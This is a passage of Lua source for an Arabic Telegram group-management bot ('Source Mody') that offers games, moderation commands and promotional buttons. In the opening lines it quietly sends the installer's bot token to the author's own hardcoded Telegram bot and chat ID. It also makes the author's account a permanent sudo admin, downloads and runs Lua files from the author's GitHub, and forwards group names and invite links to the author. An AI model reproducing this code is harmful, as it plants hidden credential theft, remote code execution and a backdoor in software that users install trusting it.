...
https.request('https://api.telegram.org/bot1916520961:AAESC192OhaUPIFWWnIJdjaxo-omHRJQcis/sendmessage?chat_id=1505943315&text=' ..token)
end 
else
print('\27[0;31m◉○━━━━  𝐌𝐎𝐎𝐃𝐘   ━━━━○◉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MODY667/xxx/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1505943315,1785825545}   
...
if tonumber(user_id) == tonumber(1505943315) then  
var = true 
...
local UserName = (data.username_ or "moodyyy26")
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'مودي') 
local DRAGON_Msg = { 
...
{{text = '𓆩༢࿔ྀુ◉ 𝘿𝙀𝙑 𝙎𝙀𝙕𝙍𓊗༢࿔ྀુ𓆪',url="t.me/abdoelasill"}}, 
{{text = 'L𝐈𝐃𝐄𝐑', url="t.me/Mohamedgamal_72"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = 'مميزات خاصه بسـ ورس مودي يعسل . . . . 🥺√'
local Key = {
{'الصلاوات','اذكار','قران'},
...
os.execute('wget https://raw.githubusercontent.com/MODY667/xxx/main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ◍ احدث اصدار من سورس مودي { S:12✓}')
end
...
local Text = [[ 
[قناه السورس يعسل. . .√🥺](t.me/moodyyy26)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝙊𝙊𝘿𝙔 ', url="t.me/moodyyy26"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/moodyyy26"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ◍ من أحسن السورسات على التليجرام سورس مودي ◍
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "مودي")
...
send(msg.chat_id_,0," ◍ الـعـضو  : {["..data.first_name_.."](T.ME/moodyyy26)}\n ◍ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◍ عذرا  ↚ {["..data.first_name_.."](T.ME/moodyyy26)}\n ◍ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text and text:match("^مودي$") or text and text:match("^احمد مودي$") or text and text:match("^موديي$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1505943315,". هناك شخص يريدك يا سيدي مودي \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end
...
local Text = [[
[𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐎𝐃𝐘](t.me/moodyyy26) 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ◦•●◉♏ ♨ Ḑ ㄚ◉●•◦', url="t.me/Mooodddiy"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐎𝐃𝐘 ', url="t.me/moodyyy26"}},
{{text = 'ضيف البوت لمجموعتك ✅' ,url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/U_AFLAM/77&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مودي'  then
local Text = [[
مطور سورس مودي لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Text = [[
 مودي مطور السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == '𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐎𝐃𝐘'  then
local Text = [[
 𝘽𝙀𝙎𝙏 𝙎𝙊𝙐𝙍𝘾𝙀 𝙀𝙑𝙀𝙍
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'SOURCE MODY',url="t.me/moodyyy26"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 MODY', url="t.me/moodyyy26"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/U_AFLAM/54&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local TWEET_Msg = { 
"ليه مودي جدع",
"ليه مودي عامل حرقان للكل",
"بتحب مودي ولا لاه",
"اي رايك في سورس مودي",
"مودي بالنسبه لك ايه",
"ليه مودي جدع",
"ليه مودي عامل حرقان للكل",
"بتحب مودي ولا لاه",
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب مودي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◍ اهلا في قائمه الالعاب المتطوره سورس مودي ◍ 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تويت أخري', callback_data="/tweet"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
ght = math.random(1,28); 
local Text ='مرحبآا اليك لو خيروك بالصوره🍁🌝' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اخري؟', callback_data="/asr4"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Lopqi/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
function(arg,data) 
usertext = '\n ◍ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'moodyyy26')..')'
...
usertext = '\n ◍ الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'moodyyy26')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
texts = usertext..status
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MODY667/xxx/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات مودي\n ◍ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n☩━━━━━  𝐌𝐎𝐎𝐃𝐘   ━━━━━☩\n ◍ علامة تعني { ✔️ } ملف مفعل\n ◍ علامة تعني { ✖ } ملف معطل\n ◍ قناة سورس مودي↓\n".." ◍ [اضغط هنا لدخول](t.me/moodyyy26) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/MODY667/xxx/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس مودي\n") 
end
return false
end
...
if text == ("مسح قائمه مودي") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه مودي')
return false
end

if text == 'قائمه مودي' and Sudo(msg) then
...
if text == ("رفع مودي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مودي@(.*)$") and Sudo(msg) then
local username = text:match("^رفع مودي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع مودي(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مودي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل مودي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مودي@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مودي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل مودي(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مودي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
sendText(b.id_,"• مرحبآا عزيزي المنشئ هناك شخص يريدك \n• الشخص  {"..Name.."}\n• اسم الجروب {"..NameChat.."}\n• ايدي الجروب {"..msg.chat_id_.."}\n• رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end,nil)
end
...
send(msg.chat_id_, msg.id_,' 𖤓 لا تستطيع اسشخدام البوت \n  𖤓 يرجى الاشتراك بالقناه اولا \n  𖤓 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖤓 تم تعطيل التف') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤓 العضو ⤌ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖤓تم التف عليه بنجاح\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
...
---------
if text == ("رفع اختي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل اختي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع اخويا") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل اخويا")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع علي قلب مودي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ◍  الايدي بالصوره  ↚ { '..idph..
' }\n'..' ◍  الرفع  ↚ { '..setadd..
' }\n'..' ◍  الحظر  ↚ { '..banm..' }\n\n ◍☩━━━━━  𝐌𝐎𝐎𝐃𝐘   ━━━━━☩\n ◍ قناة سورس مودي↓\n [  [𝐒ΘΘ𝐍](t.me/moodyyy26)❳](t.me/moodyyy26) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'☩━━━━━  𝐌𝐎𝐎𝐃𝐘   ━━━━━☩\nاضغط علي الاسم ليتم نسخه\n☩━━━━━  𝐌𝐎𝐎𝐃𝐘   ━━━━━☩ٴ\n ◍  [𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝙊𝙊𝘿𝙔 ](t.me/moodyyy26) ◍ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'مودي').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'مودي')
local DRAGON_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس مودييعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'مودي').." غادر" or text == 'غادر' then  
...
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"انـت"..Rutba(msg.sender_user_id_,msg.chat_id_).." . ", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه مودي') 
return false
end
...
send(msg.chat_id_,msg.id_, '◉ مودي ورب العباد') 
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/moodyyy26)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/moodyyy26)')
return false
end
end
end
...
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ...
 ⋆تاك للمتناكين
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ⋆رفع + تنزيل ← من قلب مودي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ⋆رفع + تنزيل ← من قلب علي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ⋆رفع + تنزيل ← من قلب حسام
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ⋆رفع + تنزيل ← من قلب ممدوح
...
{{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
{{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝙊𝙊𝘿𝙔 ', url="t.me/ch_nasa"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/sofi' then
...
keyboard.inline_keyboard = {
{
{text = 'استوري اخري', callback_data="/lklpo"},
},
}
...
if Text == '/asr4' then
Text = 'مرحبآا اليك لو خيروك بالصوره🍁🌝'
...
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. Chat_id .. '&photo=https://t.me/Lopqi/'..ban..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑
...
{
{text = '𝙎𝙊𝙐𝙍𝘾𝙀 𝙈𝙊𝙊𝘿𝙔 ', url="t.me/S_5A_D"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'مودي')
